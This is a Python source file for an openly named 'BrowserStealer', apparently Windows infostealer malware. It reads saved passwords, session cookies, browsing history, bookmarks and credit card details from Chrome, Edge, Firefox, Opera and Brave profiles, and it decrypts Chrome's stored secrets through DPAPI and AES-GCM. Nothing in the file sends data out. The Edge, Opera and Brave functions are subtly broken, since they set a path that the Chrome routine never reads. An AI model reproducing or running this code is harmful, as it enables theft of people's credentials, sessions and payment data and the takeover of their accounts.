import os, json, base64, sqlite3, shutil, win32crypt, ctypes, hashlib
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import psutil

class BrowserStealer:
    def __init__(self):
        self.browsers = {
            'chrome': self.steal_chrome,
            'edge': self.steal_edge,
            'firefox': self.steal_firefox,
            'opera': self.steal_opera,
            'brave': self.steal_brave
        }
        
    def extract_all(self):
        """Extract data from all browsers."""
        results = {}
        
        for browser_name, extract_func in self.browsers.items():
            try:
                results[browser_name] = extract_func()
            except Exception as e:
                results[browser_name] = {'error': str(e)}
        
        return results
    
    def steal_chrome(self):
        """Steal Chrome passwords, cookies, history, bookmarks."""
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
        if not os.path.exists(chrome_path):
            return {'error': 'Chrome not found'}
        
        results = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'bookmarks': [],
            'credit_cards': [],
            'autofill': []
        }
        
        # Get master key
        master_key = self.get_chrome_master_key(chrome_path)
        
        # Process each profile
        profiles = ['Default'] + [d for d in os.listdir(chrome_path) if d.startswith('Profile')]
        
        for profile in profiles:
            profile_path = os.path.join(chrome_path, profile)
            if not os.path.isdir(profile_path):
                continue
            
            # Passwords
            login_db = os.path.join(profile_path, 'Login Data')
            if os.path.exists(login_db):
                results['passwords'].extend(self.extract_chrome_passwords(login_db, master_key))
            
            # Cookies
            cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
            if os.path.exists(cookie_db):
                results['cookies'].extend(self.extract_chrome_cookies(cookie_db, master_key))
            
            # History
            history_db = os.path.join(profile_path, 'History')
            if os.path.exists(history_db):
                results['history'].extend(self.extract_chrome_history(history_db))
            
            # Bookmarks
            bookmarks_file = os.path.join(profile_path, 'Bookmarks')
            if os.path.exists(bookmarks_file):
                results['bookmarks'].extend(self.extract_chrome_bookmarks(bookmarks_file))
            
            # Credit Cards
            cc_db = os.path.join(profile_path, 'Web Data')
            if os.path.exists(cc_db):
                results['credit_cards'].extend(self.extract_chrome_credit_cards(cc_db, master_key))
        
        return results
    
    def get_chrome_master_key(self, chrome_path):
        """Get Chrome's master encryption key."""
        local_state_path = os.path.join(chrome_path, 'Local State')
        
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            # Decrypt using CryptUnprotectData
            import ctypes.wintypes
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD),
                           ('pbData', ctypes.POINTER(ctypes.c_char))]
            
            blob_in = DATA_BLOB(len(encrypted_key), ctypes.c_char_p(encrypted_key))
            blob_out = DATA_BLOB()
            
            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, 
                                                        None, 0, ctypes.byref(blob_out)):
                key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                return key
        except:
            pass
        
        return None
    
    def decrypt_chrome_value(self, encrypted_value, master_key):
        """Decrypt Chrome encrypted value."""
        if not encrypted_value:
            return ""
        
        try:
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                # AES-GCM encryption
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            else:
                # Old DPAPI encryption
                import win32crypt
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        except:
            return "[DECRYPTION FAILED]"
    
    def extract_chrome_passwords(self, login_db, master_key):
        """Extract passwords from Chrome Login Data."""
        passwords = []
        
        # Copy database to avoid locks
        temp_db = os.path.join(os.environ['TEMP'], 'chrome_login_temp.db')
        shutil.copy2(login_db, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                if encrypted_password:
                    password = self.decrypt_chrome_value(encrypted_password, master_key)
                else:
                    password = ""
                
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': password
                })
            
            conn.close()
        except:
            pass
        
        os.remove(temp_db)
        return passwords
    
    def extract_chrome_cookies(self, cookie_db, master_key):
        """Extract cookies from Chrome Cookies database."""
        cookies = []
        
        temp_db = os.path.join(os.environ['TEMP'], 'chrome_cookies_temp.db')
        shutil.copy2(cookie_db, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
            
            for row in cursor.fetchall():
                host, name, encrypted_value, path, expires = row
                
                if encrypted_value:
                    value = self.decrypt_chrome_value(encrypted_value, master_key)
                else:
                    value = ""
                
                cookies.append({
                    'host': host,
                    'name': name,
                    'value': value,
                    'path': path,
                    'expires': expires
                })
            
            conn.close()
        except:
            pass
        
        os.remove(temp_db)
        return cookies
    
    def extract_chrome_history(self, history_db):
        """Extract browsing history."""
        history = []
        
        temp_db = os.path.join(os.environ['TEMP'], 'chrome_history_temp.db')
        shutil.copy2(history_db, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit = row
                
                # Convert Chrome timestamp to datetime
                if last_visit:
                    chrome_epoch = 11644473600000000  # January 1, 1601
                    timestamp = (last_visit - chrome_epoch) / 1000000
                    last_visit_dt = datetime.fromtimestamp(timestamp)
                else:
                    last_visit_dt = None
                
                history.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit': last_visit_dt.isoformat() if last_visit_dt else None
                })
            
            conn.close()
        except:
            pass
        
        os.remove(temp_db)
        return history
    
    def extract_chrome_bookmarks(self, bookmarks_file):
        """Extract bookmarks."""
        bookmarks = []
        
        try:
            with open(bookmarks_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            def extract_bookmarks(node, folder=""):
                if 'children' in node:
                    for child in node['children']:
                        if child['type'] == 'url':
                            bookmarks.append({
                                'folder': folder,
                                'name': child.get('name', ''),
                                'url': child.get('url', '')
                            })
                        elif child['type'] == 'folder':
                            extract_bookmarks(child, child.get('name', 'Unknown'))
            
            if 'roots' in data:
                for root in data['roots'].values():
                    extract_bookmarks(root)
        
        except:
            pass
        
        return bookmarks
    
    def extract_chrome_credit_cards(self, web_data_db, master_key):
        """Extract saved credit cards."""
        cards = []
        
        temp_db = os.path.join(os.environ['TEMP'], 'chrome_webdata_temp.db')
        shutil.copy2(web_data_db, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            
            for row in cursor.fetchall():
                name, exp_month, exp_year, encrypted_card = row
                
                if encrypted_card:
                    card_number = self.decrypt_chrome_value(encrypted_card, master_key)
                else:
                    card_number = ""
                
                cards.append({
                    'name': name,
                    'exp_month': exp_month,
                    'exp_year': exp_year,
                    'card_number': card_number[-4:] if card_number else ""  # Last 4 only
                })
            
            conn.close()
        except:
            pass
        
        os.remove(temp_db)
        return cards
    
    def steal_edge(self):
        """Steal Microsoft Edge data (Chrome-based)."""
        edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')
        
        if not os.path.exists(edge_path):
            return {'error': 'Edge not found'}
        
        # Edge uses same format as Chrome
        chrome_stealer = BrowserStealer()
        chrome_stealer.chrome_path = edge_path
        return chrome_stealer.steal_chrome()
    
    def steal_firefox(self):
        """Steal Firefox passwords and cookies."""
        firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        
        if not os.path.exists(firefox_path):
            return {'error': 'Firefox not found'}
        
        results = {
            'passwords': [],
            'cookies': []
        }
        
        # Find profiles
        profiles = []
        for item in os.listdir(firefox_path):
            if os.path.isdir(os.path.join(firefox_path, item)):
                profiles.append(item)
        
        for profile in profiles:
            profile_path = os.path.join(firefox_path, profile)
            
            # Find key database
            key_db = os.path.join(profile_path, 'key4.db')
            if os.path.exists(key_db):
                # Extract passwords from logins.json
                logins_file = os.path.join(profile_path, 'logins.json')
                if os.path.exists(logins_file):
                    try:
                        with open(logins_file, 'r') as f:
                            logins = json.load(f)
                        
                        for login in logins.get('logins', []):
                            results['passwords'].append({
                                'url': login.get('hostname', ''),
                                'username': login.get('username', ''),
                                'password': '[ENCRYPTED - NEEDS MASTER PASSWORD]'
                            })
                    except:
                        pass
            
            # Cookies
            cookies_db = os.path.join(profile_path, 'cookies.sqlite')
            if os.path.exists(cookies_db):
                try:
                    conn = sqlite3.connect(cookies_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value, path, expiry FROM moz_cookies")
                    
                    for row in cursor.fetchall():
                        host, name, value, path, expiry = row
                        results['cookies'].append({
                            'host': host,
                            'name': name,
                            'value': value,
                            'path': path,
                            'expiry': expiry
                        })
                    
                    conn.close()
                except:
                    pass
        
        return results
    
    def steal_opera(self):
        """Steal Opera data (Chrome-based)."""
        opera_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable')
        
        if not os.path.exists(opera_path):
            return {'error': 'Opera not found'}
        
        # Opera uses same format as Chrome
        chrome_stealer = BrowserStealer()
        chrome_stealer.chrome_path = opera_path
        return chrome_stealer.steal_chrome()
    
    def steal_brave(self):
        """Steal Brave data (Chrome-based)."""
        brave_path = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data')
        
        if not os.path.exists(brave_path):
            return {'error': 'Brave not found'}
        
        # Brave uses same format as Chrome
        chrome_stealer = BrowserStealer()
        chrome_stealer.chrome_path = brave_path
        return chrome_stealer.steal_chrome()